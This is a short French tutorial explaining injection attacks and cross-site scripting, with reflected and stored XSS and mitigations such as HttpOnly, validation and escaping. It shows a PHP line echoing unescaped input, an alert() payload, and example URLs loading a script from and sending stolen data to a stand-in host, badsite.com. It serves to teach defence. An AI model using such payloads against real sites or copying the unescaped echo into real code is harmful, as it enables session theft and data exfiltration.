# Cross Site Scripting

L'injection est une attaque consistant à envoyer des données à une application de manière à modifier la signification des commandes qui sont interprétées par le logiciel. Cette attaque profite des nombreux accès possibles.

Cette attaque peut être faite sur :
- SQL,
- LDAP,
- le système d'exploitation,
- XPath,
- XQuery,
- les expressions.

## XSS ("Cross-Site Scripting")

XSS ("Cross-Site Scripting") est une attaque par injection HTML consistant à injecter des scripts milieux dans des sites Web de confiance.

Exemple en PHP :

```
echo "The value you entered is: " . $\_GET['val’];
```

Le format attendu de l'URL est `https://example.com/test.php?val=123`. L'attaque consiste à injecter du code comme `https://example.com/test.php?val=<script>alert(‘Proof this is an XSS’);</script>`.

## XSS réfléchi (reflected XSS)

Une attaque "reflected XSS" consiste à envoyer un lien avec du code injecté à une victime comme ceci : `https://example.com/test.php?val=<script src=”http://badsite.com/badscript.js”></script>`.

Quand la victime clique sur lien, un script d'un site externe est chargé dans la page Web, bénéficiant ainsi d'un accès complet à l'environnement DOM du navigateur. Le script peut alors effectuer une action malicieuse en bénéficiant de l'authentification de l'utilisateur : `http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues`.

## XSS stockée (stored XSS)

Une attaque "stored XSS" consiste à stocker l'injection de code dans une base de données ou un autre espace de stockage. Elle survient alors automatiquement sans aucune action de la victime.

Cette attaque est plus redoutable que "reflected XSS".

## Mitigation des risques d'attaque XSS

Pour mitiger les risques d'attaque XSS, il y a essentiellement deux techniques :
- utiliser le flag `HttpOnly`,
  - Si `HttpOnly` est inclus dans l'en-tête de la réponse HTTP et que le navigateur supporte cette option, le cookie n'est pas accessible par le script côté client.
- valider les données :
  - les entiers ne doivent contenir que des chiffres,
  - les nombres à virgule flottante que des chiffres et le caractère ".",
  - les numéros de carte bancaire que des chiffres et des "-", ...
- utiliser les caractères "escape" et rendre saines les données ("sanitize").
